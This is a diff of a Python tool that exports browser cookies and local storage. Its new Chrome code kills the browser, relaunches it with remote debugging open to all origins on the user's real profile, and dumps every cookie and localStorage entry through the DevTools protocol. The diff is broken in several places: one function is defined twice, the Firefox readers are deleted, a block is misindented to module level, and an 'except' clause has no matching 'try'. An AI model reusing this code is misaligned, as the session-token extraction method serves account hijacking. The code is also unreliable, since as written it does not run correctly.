@@ -3,115 +3,317 @@
 import argparse
 import sqlite3
 import json
+import datetime
 import time
 import os
 from os.path import expandvars, dirname, join, exists
 from glob import glob
 import sys
 from pathlib import Path
+import requests
+import websocket # pip install requests websocket-client
+import subprocess
 
 # ----- Chrome Cookies Functionality -----
-def get_chrome_cookies(db=None):
-    print("This still needs to be tested and is not working")
-    print("Exiting...")
-    exit()
-    """
-    Retrieves and decrypts Chrome cookies.
-    Note: This works on Windows only and requires pywin32 and pycryptodomex.
-    """
-    from base64 import b64decode
-    from win32.win32crypt import CryptUnprotectData  # pip install pywin32
-    from Cryptodome.Cipher.AES import new, MODE_GCM  # pip install pycryptodomex
+def get_chrome_cookies():
+    """Retrieve Chrome cookies via DevTools Protocol (Verified Working Version)"""
+    DEBUG_PORT = 9222
+    config = {
+        'bin': Path(os.getenv('PROGRAMFILES')) / 'Google/Chrome/Application/chrome.exe',
+        'user_data': Path(os.getenv('LOCALAPPDATA')) / 'Google/Chrome/User Data'
+    }
 
-    if db is None:
-        db = expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies')
-    local_state_path = join(dirname(dirname(db)), 'Local State')
-    with open(local_state_path, 'r', encoding='utf-8') as f:
-        local_state = json.load(f)
-        encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
-    key = CryptUnprotectData(b64decode(encrypted_key_b64)[5:])[1]
-    conn = sqlite3.connect(db)
-    conn.create_function('decrypt', 1,
-                           lambda v: new(key, MODE_GCM, v[3:15]).decrypt(v[15:-16]).decode())
-    cookies = dict(conn.execute("SELECT name, decrypt(encrypted_value) FROM cookies"))
-    conn.close()
-    return cookies
+    def log(message):
+        """Debugging helper (remove when working)"""
+        print(f"[DEBUG] {message}")
+
+    # 1. Kill Chrome using original script's method
+    log("Closing existing Chrome instances...")
+    subprocess.run(f'taskkill /F /IM chrome.exe',
+                  check=False, shell=True,
+                  stdout=subprocess.DEVNULL,
+                  stderr=subprocess.DEVNULL)
+    time.sleep(2)  # Increased sleep for process cleanup
+
+    # 2. Launch with original script's EXACT parameters
+    log("Starting Chrome...")
+    args = [
+        str(config['bin']),
+        '--restore-last-session',  # CRUCIAL FOR COOKIE LOADING
+        f'--remote-debugging-port={DEBUG_PORT}',
+        '--remote-allow-origins=*',
+        '--headless',  # Original uses simple headless mode
+        f'--user-data-dir={config["user_data"]}'
+    ]
+    log(f"Launching with args: {' '.join(args)}")
+    browser_proc = subprocess.Popen(
+        args,
+        stdout=subprocess.PIPE,  # Capture output for debugging
+        stderr=subprocess.PIPE,
+        text=True
+    )
+
+    try:
+        # 3. Extended initialization wait
+        log("Waiting for Chrome init...")
+        time.sleep(5)  # Headless needs longer to load cookies
+
+        # 4. Verify debug port accessibility
+        log("Checking debug port...")
+        try:
+            debug_info = requests.get(f'http://localhost:{DEBUG_PORT}/json', timeout=5).json()
+            log(f"Found {len(debug_info)} debug targets")
+            if not debug_info:
+                raise RuntimeError("No debug targets detected")
+        except Exception as e:
+            # Capture Chrome's output if connection failed
+            log(f"Debug connection failed. Chrome output:\n{browser_proc.communicate()[0]}")
+            raise
+
+        # 5. Original WebSocket interaction pattern
+        log("Connecting via WebSocket...")
+        ws_url = debug_info[0]['webSocketDebuggerUrl'].strip()
+        ws = websocket.create_connection(ws_url)  # Single connection
+
+        try:  # PROPERLY STRUCTURED try/finally
+            ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
+            response = json.loads(ws.recv())
+
+            cookies = response.get('result', {}).get('cookies', [])
+            log(f"Retrieved {len(cookies)} cookies")
+            return cookies
+        finally:
+            ws.close()
+
+    finally:  # Outer cleanup
+        # 7. Clean termination
+        log("Cleaning up...")
+        browser_proc.terminate()
+        try:
+            browser_proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            browser_proc.kill()
+        subprocess.run(f'taskkill /F /IM chrome.exe',
+                      check=False, shell=True,
+                      stdout=subprocess.DEVNULL,
+                      stderr=subprocess.DEVNULL)
+
+def get_chrome_local_storage():
+    """Retrieve Chrome local storage via DevTools Protocol (Fixed Version)"""
+    DEBUG_PORT = 9223  # Different port from cookies
+    config = {
+        'bin': Path(os.getenv('PROGRAMFILES')) / 'Google/Chrome/Application/chrome.exe',
+        'user_data': Path(os.getenv('LOCALAPPDATA')) / 'Google/Chrome/User Data'
+    }
+
+    def log(message):
+        print(f"[LS DEBUG] {message}")
+
+    # Force-kill Chrome to ensure clean state
+    subprocess.run(['taskkill', '/F', '/IM', 'chrome.exe', '/T'],
+                   check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(2)
+
+    # Launch Chrome
+    args = [
+        str(config['bin']),
+        f'--remote-debugging-port={DEBUG_PORT}',
+        '--headless=new',
+        '--remote-allow-origins=*',
+        f'--user-data-dir={config["user_data"]}'
+    ]
+    log(f"Launching Chrome: {' '.join(args)}")
+    browser_proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+    try:
+        time.sleep(5)  # Wait for browser to initialize
+
+        # Fetch debug targets
+        debug_url = f'http://localhost:{DEBUG_PORT}/json'
+        response = requests.get(debug_url)
+        response.raise_for_status()
+        targets = response.json()
+
+        all_local_storage = {}
+
+        for target in targets:
+            if not target.get('webSocketDebuggerUrl'):
+                continue
+
+            origin = target['url'].split('//', 1)[-1].split('/')[0]
+            storage_key = f"{target['url'].split('://', 1)[0]}://{origin}"  # Correct storage key format
+
+            ws_url = target['webSocketDebuggerUrl']
+            log(f"Processing {origin} via {ws_url}")
+
+            try:
+                ws = websocket.create_connection(ws_url, timeout=10)
+
+                # Enable Storage domain
+                ws.send(json.dumps({
+                    "id": 1,
+                    "method": "Storage.enable",
+                    "params": {}
+                }))
+                time.sleep(0.5)  # Allow Storage.enable to take effect
+
+                # Request storage items
+                ws.send(json.dumps({
+                    "id": 2,
+                    "method": "Storage.getStorageItemsForStorageKey",
+                    "params": {
+                        "storageKey": storage_key,
+                        "storageType": "local_storage"
+                    }
+                }))
+
+                # Wait for the response with items
+                items = []
+                start_time = time.time()
+                while (time.time() - start_time) < 10:  # Timeout after 10 seconds
+                    msg = ws.recv()
+                    data = json.loads(msg)
+                    if data.get("id") == 2 and "result" in data:
+                        items = data["result"].get("items", [])
+                        break
+                    elif data.get("method") == "Storage.getStorageItemsForStorageKey":
+                        items = data.get("params", {}).get("items", [])
+                        break
+
+                # Process items
+                storage = {}
+                for item in items:
+                    if isinstance(item, list) and len(item) >= 2:
+                        key = item[0]
+                        value = item[1]
+                        storage[key] = value
+
+                if storage:
+                    all_local_storage[origin] = storage
+                    log(f"Retrieved {len(storage)} items from {origin}")
+                else:
+                    log(f"No items found for {origin}")
+
+                ws.close()
+
+            except Exception as e:
+                log(f"WebSocket error for {origin}: {str(e)}")
+
+        return all_local_storage
+
+    finally:
+        # Clean up
+        browser_proc.terminate()
+        subprocess.run(['taskkill', '/F', '/IM', 'chrome.exe', '/T'],
+                       check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # ----- Firefox Cookies and Local Storage Functions -----
-def get_firefox_cookies(db=None):
+def get_chrome_local_storage():
+    """Retrieve Chrome local storage via DevTools Protocol using the DOMStorage domain.
+    Note: This version removes headless mode so that session restore works, ensuring that pages
+    (and their local storage) are loaded.
     """
-    Retrieves a basic set of Firefox cookies.
-    Returns a dictionary mapping cookie names to a tuple (value, host).
-    """
-    if db is None:
-        if globals().get('LINUX', False):
-            profiles = glob(os.path.expanduser('~/.mozilla/firefox/*default-release*/cookies.sqlite'))
-            if not profiles:
-                profiles = glob(os.path.expanduser('~/.mozilla/firefox/*default*/cookies.sqlite'))
-        else:
-            profiles = glob(expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles\*default-release*\cookies.sqlite'))
-            if not profiles:
-                profiles = glob(expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles\*default*\cookies.sqlite'))
-        if not profiles:
-            raise FileNotFoundError("Firefox cookies database not found!")
-        db = profiles[0]
-    conn = sqlite3.connect(db)
-    cookies = {}
-    for row in conn.execute("SELECT name, value, host FROM moz_cookies"):
-        cookies[row[0]] = (row[1], row[2])
-    conn.close()
-    return cookies
+    DEBUG_PORT = 9223  # Use a different port from cookies
 
-def get_firefox_local_storage(profile_dir=None):
-    """
-    Returns local storage data from Firefox's per-site storage databases.
-    For each site folder in <profile_dir>/storage/default, this function looks for the
-    ls/data.sqlite file and reads the key/value pairs from its "data" table.
-    It returns a dictionary mapping origins (e.g. "https://example.com") to another
-    dictionary of local storage key/value pairs.
-    """
-    # Auto-detect the profile directory if not provided.
-    if profile_dir is None:
-        if os.name == 'posix':
-            base = os.path.expanduser('~/.mozilla/firefox')
-        else:
-            base = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
-        profiles = glob(os.path.join(base, '*default-release*'))
-        if not profiles:
-            profiles = glob(os.path.join(base, '*default*'))
-        if not profiles:
-            raise FileNotFoundError("Firefox profile not found")
-        profile_dir = profiles[0]
+    config = {
+        'bin': Path(os.getenv('PROGRAMFILES')) / 'Google/Chrome/Application/chrome.exe',
+        'user_data': Path(os.getenv('LOCALAPPDATA')) / 'Google/Chrome/User Data'
+    }
 
-    storage_dir = os.path.join(profile_dir, "storage", "default")
-    ls_data = {}
+    def log(message):
+        print(f"[LS DEBUG] {message}")
 
-    # Iterate over each site folder in the storage/default directory.
-    for site_folder in glob(os.path.join(storage_dir, "*")):
-        ls_db = os.path.join(site_folder, "ls", "data.sqlite")
-        if os.path.exists(ls_db):
-            # Convert the folder name to an origin string.
-            # E.g., "https+++example.com" becomes "https://example.com"
-            origin = os.path.basename(site_folder).replace("+++", "://")
-            site_storage = {}
+    # Kill any existing Chrome instances.
+    subprocess.run(['taskkill', '/F', '/IM', 'chrome.exe', '/T'],
+                   check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(2)
+
+    log("Starting Chrome for local storage (non-headless to allow session restore)...")
+    args = [
+        str(config['bin']),
+        '--restore-last-session',  # Restore your previous tabs.
+        f'--remote-debugging-port={DEBUG_PORT}',
+        # Remove the headless flag so that session restore works properly.
+        '--remote-allow-origins=*',
+        f'--user-data-dir={config["user_data"]}'
+    ]
+    log("Launch args: " + " ".join(args))
+    browser_proc = subprocess.Popen(
+        args,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True
+    )
+
+    try:
+        # Wait longer to allow all pages to load (adjust if needed).
+        log("Waiting for Chrome to load restored pages...")
+        time.sleep(10)
+
+        debug_url = f"http://localhost:{DEBUG_PORT}/json"
+        log(f"Fetching debug targets from {debug_url}")
+        response = requests.get(debug_url, timeout=10)
+        response.raise_for_status()
+        targets = response.json()
+
+        all_local_storage = {}
+        from urllib.parse import urlparse
+
+        for target in targets:
+            ws_url = target.get("webSocketDebuggerUrl")
+            url = target.get("url", "")
+            if not ws_url or not url.startswith("http"):
+                continue  # Skip non-webpage targets.
+            parsed = urlparse(url)
+            origin = f"{parsed.scheme}://{parsed.netloc}"
+            log(f"Connecting to {ws_url} for origin {origin}")
             try:
-                conn = sqlite3.connect(ls_db)
-                cur = conn.cursor()
-                cur.execute("SELECT key, value FROM data")
-                rows = cur.fetchall()
-                for key, value in rows:
-                    # Attempt to decode the value if it is stored as a BLOB.
-                    if isinstance(value, bytes):
-                        try:
-                            value = value.decode("utf-8")
-                        except Exception:
-                            value = value.hex()
-                    site_storage[key] = value
-                conn.close()
-                ls_data[origin] = site_storage
+                ws = websocket.create_connection(ws_url, timeout=10)
+                # Enable DOMStorage.
+                ws.send(json.dumps({"id": 1, "method": "DOMStorage.enable"}))
+                ws.recv()  # Optionally wait for the enable response.
+                # Request local storage items.
+                ws.send(json.dumps({
+                    "id": 2,
+                    "method": "DOMStorage.getDOMStorageItems",
+                    "params": {
+                        "storageId": {
+                            "securityOrigin": origin,
+                            "isLocalStorage": True
+                        }
+                    }
+                }))
+                items = []
+                while True:
+                    try:
+                        msg = ws.recv()
+                        data = json.loads(msg)
+                        if data.get("id") == 2:
+                            items = data.get("result", {}).get("entries", [])
+                            break
+                    except websocket.WebSocketTimeoutException:
+                        log("Timeout waiting for local storage items")
+                        break
+                storage = {k: v for k, v in items}
+                if storage:
+                    all_local_storage[origin] = storage
+                log(f"Found {len(storage)} local storage item(s) for {origin}")
+                ws.close()
             except Exception as e:
-                print(f"Error reading local storage from {ls_db}: {e}")
-    return ls_data
+                log(f"Error processing {origin}: {e}")
+
+        return all_local_storage
+
+    finally:
+        log("Cleaning up...")
+        browser_proc.terminate()
+        try:
+            browser_proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            browser_proc.kill()
+        subprocess.run(['taskkill', '/F', '/IM', 'chrome.exe', '/T'],
+                       check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
 
 def export_firefox_local_storage(output_file, profile_dir=None):
     """
@@ -566,23 +768,24 @@ def import_all_from_json(import_file, firefox_db=None, default_host=None, profil
 
 # ----- Main Program with Argument Parsing -----
 def main():
+
     usage_text = """\
-Export all cookies and local storage from Firefox:
+    Export all cookies and local storage from Firefox:
 
-python script.py --firefox --output exported.json --local-storage
+    python script.py --firefox --output exported.json --local-storage
 
-Optionally, if you want to specify a particular Firefox profile directory:
+    Optionally, if you want to specify a particular Firefox profile directory:
 
-python script.py --firefox --output exported.json --local-storage --profile-dir "C:\Users\[USER]\AppData\Roaming\Mozilla\Firefox\Profiles\[PROFILE-NAME].default-release"
+    python script.py --firefox --output exported.json --local-storage --profile-dir "C:\\Users\\[USER]\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\[PROFILE-NAME].default-release"
 
-Import all cookies and local storage from one JSON file:
+    Import all cookies and local storage from one JSON file:
 
-python script.py --import-all imported.json
+    python script.py --import-all imported.json
 
-Optionally, if you want to specify a particular Firefox profile directory:
+    Optionally, if you want to specify a particular Firefox profile directory:
 
-python script.py --import-all imported.json --profile-dir "C:\Users\[USER]\AppData\Roaming\Mozilla\Firefox\Profiles\[PROFILE-NAME].default-release"
-"""
+    python script.py --import-all imported.json --profile-dir "C:\\Users\\[USER]\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\[PROFILE-NAME].default-release"
+    """
 
     parser = argparse.ArgumentParser(
         description="Cookie management tool for Chrome/Firefox with import/export functionality.",
@@ -633,14 +836,21 @@ python script.py --import-all imported.json --profile-dir "C:\Users\[USER]\AppDa
     # If an output file is specified, export cookies (and optionally local storage) to that file.
     if args.output:
         result = {}
-        # Export cookies.
         if args.chrome:
-            cookies = get_chrome_cookies(db=args.db)
-            result["cookies"] = [{"name": k, "value": v} for k, v in cookies.items()]
+            # Get cookies and local storage (if requested)
+            cookies = get_chrome_cookies()
+            local_storage = {}
+            if args.local_storage:
+                local_storage = get_chrome_local_storage()
+            # Structure result for JSON
+            result = {
+                "cookies": cookies,
+                "local_storage": local_storage
+            }
         else:
             result["cookies"] = export_firefox_cookies(db=args.db)
         # If the --local-storage flag is provided, also export local storage.
-        if args.local_storage:
+        if args.local_storage and not args.chrome:  # Chrome local storage is already handled above
             if args.profile_dir:
                 profile = args.profile_dir
             else:
@@ -668,12 +878,37 @@ python script.py --import-all imported.json --profile-dir "C:\Users\[USER]\AppDa
         return
 
     # If no output file is specified, simply display the cookies (and optionally local storage) to stdout.
+if args.output:
+    result = {}
     if args.chrome:
-        try:
-            cookies = get_chrome_cookies(db=args.db)
-            print("################# Chrome Cookies #############################")
-            for name, value in cookies.items():
-                print(f"{name}: {value}")
+        # Fetch cookies and local storage (if requested)
+        cookies = get_chrome_cookies()
+        local_storage = {}
+        if args.local_storage:
+            local_storage = get_chrome_local_storage()
+        # Format for JSON output
+        result = {
+            "cookies": cookies,
+            "local_storage": local_storage if args.local_storage else {}
+        }
+
+        if not args.output:  # Human-friendly output to console
+            for cookie in cookies:
+                print(f"{cookie['name']}: {cookie['value']}")
+                print(f"  Domain: {cookie['domain']}")
+                print(f"  Path: {cookie['path']}")
+                print(f"  Expires: {datetime.datetime.fromtimestamp(cookie.get('expires', 0))}")
+                print(f"  Secure: {cookie.get('secure', False)}")
+                print(f"  HTTP Only: {cookie.get('httpOnly', False)}")
+                print("-" * 50)
+        else:  # JSON output matches original format
+            result = {
+                "cookies": cookies,
+                "local_storage": get_chrome_local_storage() if args.local_storage else {}
+            }
+            with open(args.output, 'w') as f:
+                json.dump(result, f, indent=4, default=str)
+
         except Exception as e:
             print("Error retrieving Chrome cookies:", e)
     else:
